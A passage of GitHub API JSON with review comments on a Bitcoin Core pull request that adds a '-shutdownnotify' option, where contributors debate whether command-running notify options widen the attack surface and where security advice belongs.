         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494960/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:23:06Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494960",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497080"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497080"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "It is related because if something was missed in other options previously we can try to make this secure and follow the same for others.\r\n\r\nAnd I have created an issue with all details.",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:26:03Z",
      "diff_hunk" : "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497080",
      "id" : 747497080,
      "in_reply_to_id" : 747321697,
      "line" : 163,
      "node_id" : "PRRC_kwDOABII584sjeZ4",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 163,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 9,
      "pull_request_review_id" : 803793109,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497080/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:26:04Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497080",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497238"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497238"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "@MarcoFalke agreed, will move the conversation to #23412 ",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:26:16Z",
      "diff_hunk" : "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747497238",
      "id" : 747497238,
      "in_reply_to_id" : 747321697,
      "line" : 163,
      "node_id" : "PRRC_kwDOABII584sjecW",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 163,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 9,
      "pull_request_review_id" : 803793308,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497238/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:26:17Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747497238",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747499702"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747499702"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "I don't mind documenting it in other places. I don't think sharing a security recommendation related to new config parameter will affect anything. It can only be helpful.\r\n\r\nI have created an issue for other details and alternatives to solve this problem. I think I can suggest changes in release notes which are part of this pull request.",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:29:39Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747499702",
      "id" : 747499702,
      "in_reply_to_id" : 747319588,
      "line" : 88,
      "node_id" : "PRRC_kwDOABII584sjfC2",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 88,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 6,
      "pull_request_review_id" : 803796469,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747499702/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:29:39Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747499702",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747503374"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747503374"
         }
      },
      "author_association" : "MEMBER",
      "body" : "> It can only be helpful.\r\n\r\nA new user downloading 29.0 won't read the release notes of 23.0 (a long EOL release at that time), so putting security documentation there won't be helpful. Also, it will bloat the release notes, making it distracting to read for users that are interested in changes. So I think wrong documentation or even right documentation in the wrong place *can* be harmful.",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:34:43Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747503374",
      "id" : 747503374,
      "in_reply_to_id" : 747319588,
      "line" : 88,
      "node_id" : "PRRC_kwDOABII584sjf8O",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 88,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 6,
      "pull_request_review_id" : 803801266,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747503374/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:34:44Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747503374",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "@prayank23 Thanks a lot for the feedback!\r\n\r\nWhile I agree that adding this option will give attackers an additional avenue to exploit newbies but IMO it does not make Bitcoin Core any less secure. \r\n\r\nAttackers can already utilize any existing `-*notify` option to perform the same attack thus adding this option does not make it less secure. Additionally, this PR simply adds an additional call to `runCommand` and will not make it more difficult to improve `runCommand` if we choose to do so in the future. Hence, I feel that there is no loss in incorporating `shutdownnotify` to Bitcoin Core. \r\n\r\nHappy to hear the opinion of the other reviewers and happy to close this PR if the majority feels that `shutdownnotify` should not be incorporated into Bitcoin Core.",
      "created_at" : "2021-11-16T14:27:16Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970326807",
      "id" : 970326807,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58451gMX",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 3,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 3,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970326807/reactions"
      },
      "updated_at" : "2021-11-16T14:27:16Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970326807",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> Attackers can already utilize any existing -*notify option to perform the same attack thus adding this option does not make it less secure. \r\n\r\nIt provides more options. I have shared few in  https://github.com/bitcoin/bitcoin/issues/23412#issuecomment-970480769 under the section `Other ways to use these config params effectively`\r\n\r\n> Additionally, this PR simply adds an additional call to runCommand and will not make it more difficult to improve runCommand if we choose to do so in the future.\r\n\r\nBased on the comments in this PR and https://github.com/bitcoin/bitcoin/issues/23412, I still have no clarity what are we going to do with `runCommand`. Neither I understand why others are ignoring this issue nor the urgency to add `-shutdownnotify`. \r\n\r\n> Hence, I feel that there is no loss in incorporating shutdownnotify to Bitcoin Core.\r\n\r\n1. It will use the same logic until we change something in `runCommand`.\r\n2. Provides more options for attackers.\r\n3. If the solution in future requires using _notifications.dat_ then everything we do in this PR will be reversed\r\n4. No clarity on documentation about security recommendations\r\n\r\n",
      "created_at" : "2021-11-16T17:09:31Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970481934",
      "id" : 970481934,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58452GEO",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970481934/reactions"
      },
      "updated_at" : "2021-11-16T17:09:31Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970481934",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "@prayank23 The whole point of notifications is not needing polling. If polling is acceptable, the user can also just use RPCs to figure out if Bitcoin Core is or isn't running, so I don't see what a \"notifications.dat\" adds.",
      "created_at" : "2021-11-16T17:11:35Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970483856",
      "id" : 970483856,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58452GiQ",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970483856/reactions"
      },
      "updated_at" : "2021-11-16T17:11:52Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970483856",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "I think it's possible to check a file for changes without polling: https://github.com/bitcoin/bitcoin/issues/23412#issuecomment-957502474",
      "created_at" : "2021-11-16T17:31:39Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970501847",
      "id" : 970501847,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58452K7X",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970501847/reactions"
      },
      "updated_at" : "2021-11-16T17:31:39Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970501847",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> I think it's possible to check a file for changes without polling: #23412 (comment)\r\n\r\nSo users that want to use notifications need to install a potentially backdoored third-party tool? Seems backward when the goal is to increase security.\r\n\r\nNow for the third time, I urge you to keep the *general* discussion about `runCommand` to #23412 and not this pull request.\r\n\r\n> Provides more options for attackers.\r\n\r\nNo it does not. All options share the same path to attack. Adding or removing one doesn't change the attack path, as long as at least one is still there.\r\n\r\n> Neither I understand why others are ignoring this issue nor the urgency to add -shutdownnotify\r\n\r\nThe issue isn't ignored, it is well known that those local configuration options (and many more, if not all) are vulnerable to an attacker that can set them. You can't force other people to work on something or force them to look at something. This is open source.",
      "created_at" : "2021-11-16T17:43:58Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970512238",
      "id" : 970512238,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58452Ndu",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970512238/reactions"
      },
      "updated_at" : "2021-11-16T17:43:58Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970512238",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> Now for the third time, I urge you to keep the general discussion about runCommand to #23412 and not this pull request.\r\n\r\nPlease check the above comment for context as it was a response. All things which aren't related to PR or can be kept separate are in issue https://github.com/bitcoin/bitcoin/issues/23412\r\n\r\n> The issue isn't ignored, it is well known that those local configuration options (and many more, if not all) are vulnerable to an attacker that can set them. You can't force other people to work on something or force them to look at something. This is open source.\r\n\r\nI can't force but I can review and comment. I don't have access to close/merge a PR. ",
      "created_at" : "2021-11-16T18:06:35Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970530105",
      "id" : 970530105,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58452R05",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970530105/reactions"
      },
      "updated_at" : "2021-11-16T18:07:11Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970530105",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "@prayank23: Your Approach NACK with your rationale has been registered. If you have further questions or discussion points please take them elsewhere (IRC etc). You have to let other reviewers review the PR and make their own mind up.",
      "created_at" : "2021-11-16T18:18:46Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970539711",
      "id" : 970539711,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58452UK_",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 1,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 1,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970539711/reactions"
      },
      "updated_at" : "2021-11-16T18:18:46Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970539711",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/16323900?v=4",
         "events_url" : "https://api.github.com/users/michaelfolkson/events{/privacy}",
         "followers_url" : "https://api.github.com/users/michaelfolkson/followers",
         "following_url" : "https://api.github.com/users/michaelfolkson/following{/other_user}",
         "gists_url" : "https://api.github.com/users/michaelfolkson/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/michaelfolkson",
         "id" : 16323900,
         "login" : "michaelfolkson",
         "node_id" : "MDQ6VXNlcjE2MzIzOTAw",
         "organizations_url" : "https://api.github.com/users/michaelfolkson/orgs",
         "received_events_url" : "https://api.github.com/users/michaelfolkson/received_events",
         "repos_url" : "https://api.github.com/users/michaelfolkson/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/michaelfolkson/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/michaelfolkson/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/michaelfolkson"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "@michaelfolkson I wasn't aware we can't respond to comments like https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970326807 in the same PR\r\n\r\nOr https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970483856\r\n\r\nNone of these comments were an attempt to stop others from reviewing this PR. \r\n\r\nI won't comment further on this PR and will discuss elsewhere.",
      "created_at" : "2021-11-16T18:26:07Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970549874",
      "id" : 970549874,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58452Wpy",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 1,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 1,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970549874/reactions"
      },
      "updated_at" : "2021-11-16T18:26:54Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970549874",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
